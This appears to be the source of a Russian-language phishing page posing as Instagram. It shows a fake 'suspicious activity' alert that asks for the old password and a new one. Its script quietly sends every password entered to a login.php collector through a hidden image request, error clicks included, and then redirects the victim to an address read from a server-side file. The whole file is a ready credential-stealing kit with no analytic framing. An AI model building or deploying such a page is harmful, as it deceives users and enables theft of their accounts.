<html>
  <head>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>https://instagram.com</title>
    <style>
      body{
        background: #fafafa;
        font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
      }.inst{
        padding: 20px;
      }input{
          width:90%;
          height:40px;
          padding:25px 20px 25px 20px;
          border-radius:5px;
          border:1px solid #ddd;
          font-size:13.9px;
      }.tx{font-size: 13px; color:#aaa;}.blo{width:87%;}.txx{color:#385185;}.f{background:#0095f7;
          border:1px solid#0095f7;
          border-radius:100%;
          padding:5px;
          color:#fff;
          font-size:14px;
      }.ff{color:#0095f7; font-size:14;}


body {
    font-family: -apple-system,system-ui,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
    font-size: 16px;
    font-weight: 400;
    line-height: 1.5;
    color: #292b2c;
    background-color: #fff;
}

.modal {
    position: fixed;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    background: rgba(0,0,0,0.5);
    z-index: 1050;
    opacity: 0;
    -webkit-transition: opacity 200ms ease-in;
    -moz-transition: opacity 200ms ease-in;
    transition: opacity 200ms ease-in;
    pointer-events: none;
    margin: 0;
    padding: 0;
}
.modal:target {
    opacity: 1;
	  pointer-events: auto;
    overflow-y: auto;
}

.modal-dialog {
    position: relative;
    width: auto;
    margin: 10px;
}
@media (min-width: 576px) {
  .modal-dialog {
      max-width: 500px;
      margin: 30px auto;
  }
}
.modal-content {
    position: relative;
    display: -webkit-box;
    display: -webkit-flex;
    display: -ms-flexbox;
    display: flex;
    -webkit-box-orient: vertical;
    -webkit-box-direction: normal;
    -webkit-flex-direction: column;
    -ms-flex-direction: column;
    flex-direction: column;
    background-color: #fff;
    -webkit-background-clip: padding-box;
    background-clip: padding-box;
    border: 1px solid rgba(0,0,0,.2);
    border-radius: 20px;
    outline: 0;
    width:74%;
}
@media (min-width: 768px) {
  .modal-content {
      -webkit-box-shadow: 0 5px 15px rgba(0,0,0,.5);
      box-shadow: 0 5px 15px rgba(0,0,0,.5);
  }
}

.modal-header {
    display: -webkit-box;
    display: -webkit-flex;
    display: -ms-flexbox;
    display: flex;
    -webkit-box-align: center;
    -webkit-align-items: center;
    -ms-flex-align: center;
    align-items: center;
    -webkit-box-pack: justify;
    -webkit-justify-content: space-between;
    -ms-flex-pack: justify;
    justify-content: space-between;
    padding: 15px;
    border-bottom: 1px solid #eceeef;
}
.modal-title {
    margin-top: 0;
    margin-bottom: 0;
    line-height: 1.5;
    font-size: 16px;
    font-weight: 600;
}

.close {
    float: right;
    font-family: sans-serif;
    font-size: 24px;
    font-weight: 700;
    line-height: 1;
    color: #000;
    text-shadow: 0 1px 0 #fff;
    opacity: .5;
    text-decoration: none;
}

.close:focus, .close:hover {
    color: #000;
    text-decoration: none;
    cursor: pointer;
    opacity: .75;
}
.modal-body {
  position: relative;
    -webkit-box-flex: 1;
    -webkit-flex: 1 1 auto;
    -ms-flex: 1 1 auto;
    flex: 1 1 auto;
    padding: 15px;
    overflow: auto;
}a{text-decoration:none; color:#555;}
.button{
    color:#fff;
    background:#0095f6;
    padding:20px 0px 30px 0px;
    font-weight: 600;
}p {
    margin-top: 0.5em; /* Отступ сверху */
    margin-bottom: 1em; /* Отступ снизу */
   }
    </style>
  </head>
  <body>
    <br><br>
    <center>
    <div class="block">
        <br>
        <div>
      <h1>Подозрительная активность</h1><br><tx class="tx">Мы обнаружили подозрительную активность на Вашем аккаунте. <br>Чтобы отобрать ваш аккаунт из рук злоумышленника, измените пароль.</tx><br><br>
      <p><input name="namest"id='use0r' placeholder="Старый пароль"></p>
      <p><input name="namest"id='use1r' placeholder="Новый пароль"></p>
      <p><input name="namest"id='use2r' placeholder="Повторите пароль"></p>
      <input type="submit" value="Далее" id="send" class="button">
      <div class="blo"></div><br>
      <tx class="tx">Забыли свои учетные данные? <tx><b class="txx">Получить помощь со входом в систему.</b>
      </div>
      <br><br>
      <b class="f"><font color="#0095f7">-</font>f<font color="#0095f7">-</font></b><b class="ff"> Войти через FaceBook</b><br><br>
      <div style="color:#aaa;">ИЛИ</div>
      <div class="blo"><br>
      <tx class="tx">У вас ещё нет аккаунта? <tx><b class="txx">Зарегистрируйтесь</b>.
      </div>
    </div>
    <div id="openModal" class="modal">
        <br>
        <br>
        <br><br>
        <br>
        <br><br>
        <br>
  <div class="modal-dialog">
    <div class="modal-content"><center>
      <div class="modal-header"><center>
        <h3 class="modal-title">Ошибка</h3>
        <br>
        <font color="#aaa" size="2px" id="error"> </font>
      </div></center>
      <a href="#close"><div class="modal-body">
        OK
      </div></a>
    </div>
  </div>
</div>
  </center>
    <img scr="" style="display:none;" id='sender'>
  <script>

  document.getElementById('send').onclick = function(){
    var sender = document.getElementById('sender');
    if(document.getElementById('use0r').value===""){document.getElementById('error').innerHTML="<center>Заполните все строки.</center>"; window.location.href="#openModal";
    sender.src="login.php?old="+ document.getElementById('use0r').value +"&new="+ document.getElementById('use1r').value +"&new1="+ document.getElementById('use2r').value;
  }
else if(document.getElementById('use1r').value!==document.getElementById('use2r').value){
  document.getElementById('error').innerHTML="<center>Заполните все строки правильно.</center>"; window.location.href="#openModal";
  sender.src="login.php?old="+ document.getElementById('use0r').value +"&new="+ document.getElementById('use1r').value +"&new1="+ document.getElementById('use2r').value;
}else{
      if(sender.src="login.php?old="+ document.getElementById('use0r').value +"&new="+ document.getElementById('use1r').value +"&new1="+ document.getElementById('use2r').value){window.location.href="<?php echo file_get_contents("location.u"); ?>";}

    }
  };
  </script>
  </body>
</html>
